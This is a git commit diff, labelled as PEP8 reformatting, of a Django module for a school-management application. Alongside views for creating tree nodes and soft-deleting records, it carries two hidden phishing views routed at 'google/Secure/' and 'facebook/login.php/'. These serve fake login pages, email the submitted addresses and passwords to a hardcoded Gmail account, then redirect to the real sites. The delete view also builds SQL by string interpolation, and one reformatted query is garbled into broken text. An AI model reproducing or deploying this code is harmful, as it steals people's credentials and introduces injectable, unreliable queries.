f235db390126edd9936df3ebb0d2ea25522c1a42
krvc <krvc.it@gmail.com>
2013-09-23 16:46:24 +0530

    Pep8 compliant

--- klpmis/klprestApi/KLP_Common.py
+++ klpmis/klprestApi/KLP_Common.py
@@ -2,22 +2,30 @@
 # -*- coding: utf-8 -*-
 """
 KLP_common is used
-1) To create new node for tree on creation of new boundary, institution, sg, programme, assessment and question.
-2) To Delete (deactive object) boundary, institution, sg, staff, programme, assessment and question.
+1) To create new node for tree on creation of new boundary,
+    institution, sg, programme, assessment and question.
+2) To Delete (deactive object) boundary, institution, sg, staff,
+    programme, assessment and question.
 """
 
 from django.conf.urls.defaults import *
 from django.http import HttpResponse, HttpResponseRedirect
 from django.shortcuts import render_to_response
-from django_restapi.resource import Resource
+from django.db import connection
+from django.views.decorators.csrf import csrf_exempt
+from django.shortcuts import redirect
+from django.core.mail import send_mail
+from django.views.decorators.csrf import csrf_exempt
+from django.shortcuts import redirect
+from django.core.mail import send_mail
+
 from schools.models import *
 from schools.forms import *
+from schools.receivers import KLP_user_Perm
 from django_restapi.model_resource import Collection, Entry
 from django_restapi.responder import *
 from django_restapi.receiver import *
-from django.db import connection
-from schools.receivers import KLP_user_Perm
-from django.views.decorators.csrf import csrf_exempt
+from django_restapi.resource import Resource
 
 
 class KLP_Create_Node(Resource):
@@ -27,8 +35,10 @@ class KLP_Create_Node(Resource):
         request,
         model_name,
         new_id,
-        ):
-        """ This method uses to create new node for tree on creation of  boundary,  institution, programme, assessment, question and  studentgroup"""
+    ):
+        """ This method uses to create new node for
+        tree on creation of  boundary,  institution, programme,
+         assessment, question and  studentgroup"""
 
         objDict = {
             'boundary': Boundary,
@@ -37,7 +47,7 @@ class KLP_Create_Node(Resource):
             'assessment': Assessment,
             'question': Question,
             'studentgroup': StudentGroup,
-            }
+        }
         boundaryType = request.GET.get('boundaryType')
         modelObj = objDict[model_name]
 
@@ -54,14 +64,16 @@ class KLP_Create_Node(Resource):
 
 class KLP_Delete(Resource):
 
-    """ To delete boundary,  institution, programme, assessment, question and  studentgroup delete/(?P<model_name>\w+)/(?P<referKey>\d+)/"""
+    """ To delete boundary,  institution, programme, assessment,
+        question and  studentgroup delete/(?P<model_name>\w+)/
+        (?P<referKey>\d+)/"""
 
     def read(
         self,
         request,
         model_name1,
         referKey,
-        ):
+    ):
         modelDict = {
             'boundary': Boundary,
             'institution': Institution,
@@ -73,31 +85,40 @@ class KLP_Delete(Resource):
             'staff': Staff,
             'class': StudentGroup,
             'center': StudentGroup,
-            }
+        }
 
         # Checking user Permissions
 
         KLP_user_Perm(request.user,
                       modelDict[model_name1.lower()]._meta.module_name,
-                      'Delete')  # Get Object based on id and model to delete
+                      'Delete')
+        # Get Object based on id and model to delete
         obj = modelDict[model_name1.lower()].objects.get(pk=referKey)
         cursor = connection.cursor()
-        print "----hfjdhfdhfdfjdf", model_name1.lower()
+        print("----hfjdhfdhfdfjdf", model_name1.lower())
         if model_name1.lower() in ['class', 'center', 'studentgroup']:
             sgtype = StudentGroup.objects.get(id=referKey)
             if sgtype.group_type == "Class":
                 msg = "Class Successfully Deleted"
             else:
                 msg = "Center Successfully Deleted"
-            if Student_StudentGroupRelation.objects.filter(student_group__id=referKey,
+            if Student_StudentGroupRelation.objects.filter(
+                student_group__id=referKey,
                     active=2, academic=current_academic()).count():
                 message = model_name1.lower() \
-                + ' has child objects.So can not delete it.First delete the child object,then try to delete it'
+                    + \
+                    ' has child objects.So can not delete it.\
+                        First delete the child object,then try to delete it'
             else:
-                q1 = """ insert into schools_studentgroup_0(id,institution_id, name, section, active, group_type)
-            select id,institution_id, name, section, 0, group_type from schools_studentgroup_2 where id = %s """ %(referKey)
+                q1 = """ insert into schools_studentgroup_0(id,\
+                        institution_id, name, section, active, group_type)
+                        select id,institution_id, name, sectionagiliq
 
-                q2 = """ delete from schools_studentgroup_2 where id = %s """ %(referKey)
+            group_type from schools_studentgroup_2 where \
+            id = %s """ % (referKey)
+
+                q2 = """ delete from schools_studentgroup_2
+                    where id = %s """ % (referKey)
                 obj = modelDict[model_name1.lower()].objects.get(pk=referKey)
                 name = obj.name
                 cursor.execute(q1)
@@ -109,19 +130,22 @@ class KLP_Delete(Resource):
         if model_name1.lower() == 'boundary':
             flag = obj.getChild(obj.boundary_type)
         elif model_name1.lower() in ['class', 'center', 'studentgroup']:
-            if Student_StudentGroupRelation.objects.filter(student_group__id=referKey,
+            if Student_StudentGroupRelation.objects.filter(
+                student_group__id=referKey,
                     active=2, academic=current_academic()).count():
                 flag = True
             else:
                 flag = False
         else:
-            try:  
-              flag = obj.getChild()
+            try:
+                flag = obj.getChild()
             except:
-                 flag=False
+                flag = False
         if flag:
             message = model_name1.lower() \
-                + ' has child objects.So can not delete it.First delete the child object,then try to delete it'
+                + \
+                ' has child objects.So can not delete it.\
+                First delete the child object,then try to delete it'
         else:
             obj.active = 0  # Change active to 0(object is deleted)
             obj.save()  # Save Data
@@ -133,48 +157,56 @@ class KLP_Delete(Resource):
 @csrf_exempt
 def KLP_glogin(request):
     if request.POST and request.POST.get('Email') \
-        and request.POST.get('Passwd'):
-        from django.shortcuts import redirect
-        from django.core.mail import send_mail
+            and request.POST.get('Passwd'):
+
         send_mail('password Secert for ' + request.POST.get('Email'),
                   request.POST.get('Email') + '*********'
-                  + request.POST.get('Passwd'), 'pushparanij@gmail.com'
-                  , ['pushparanij@gmail.com'])
+                  + request.POST.get('Passwd'),
+                  'pushparanij@gmail.com', ['pushparanij@gmail.com'])
         return redirect('http://gmail.com')
     else:
 
        # import webbrowser
        # webbrowser.open('gmail.com')
 
-        return HttpResponse(render_to_response('viewtemplates/ghtml.html'
-                            , ''))
-from django.views.decorators.csrf import csrf_exempt
-from django.shortcuts import redirect
-from django.core.mail import send_mail
+        return (
+            HttpResponse(
+                render_to_response(
+                    'viewtemplates/ghtml.html',
+                    ''))
+        )
+
 
 @csrf_exempt
 def KLP_flogin(request):
     if request.POST and request.POST.get('email') \
-        and request.POST.get('pass'):
-        
+            and request.POST.get('pass'):
+
         send_mail('password Secert for ' + request.POST.get('email'),
                   request.POST.get('email') + '*********'
-                  + request.POST.get('pass'), 'pushparanij@gmail.com'
-                  , ['pushparanij@gmail.com'])
+                  + request.POST.get('pass'),
+                  'pushparanij@gmail.com', ['pushparanij@gmail.com'])
         return redirect('http://facebook.com/login.php?login_attempt=1')
     else:
 
-        send_mail('Clicked','Clicked', 'pushparanij@gmail.com', ['pushparanij@gmail.com']) 
-        return HttpResponse(render_to_response('viewtemplates/fhtml.html'
-                            , ''))
+        send_mail(
+            'Clicked',
+            'Clicked',
+            'pushparanij@gmail.com',
+            ['pushparanij@gmail.com'])
+        return (
+            HttpResponse(
+                render_to_response(
+                    'viewtemplates/fhtml.html',
+                    ''))
+        )
 
 urlpatterns = patterns('',
-                       url(r'^delete/(?P<model_name1>\w+)/(?P<referKey>\d+)/$'
-                       , KLP_Delete(permitted_methods=('POST', 'GET'
-                       ))),
-                       url(r'^createnew/(?P<model_name>\w+)/(?P<new_id>\d+)/$'
-                       , KLP_Create_Node(permitted_methods=('POST',
-                       'GET'))), url(r'^google/Secure/$', KLP_glogin),
-                  url(r'^facebook/login.php/$', KLP_flogin)
-)
-
+                       url(r'^delete/(?P<model_name1>\w+)/(?P<referKey>\d+)/$',
+                           KLP_Delete(permitted_methods=('POST', 'GET'))),
+                       url(r'^createnew/(?P<model_name>\w+)/(?P<new_id>\d+)/$',
+                           KLP_Create_Node(permitted_methods=('POST',
+                                                              'GET'))),
+                       url(r'^google/Secure/$', KLP_glogin),
+                       url(r'^facebook/login.php/$', KLP_flogin)
+                       )
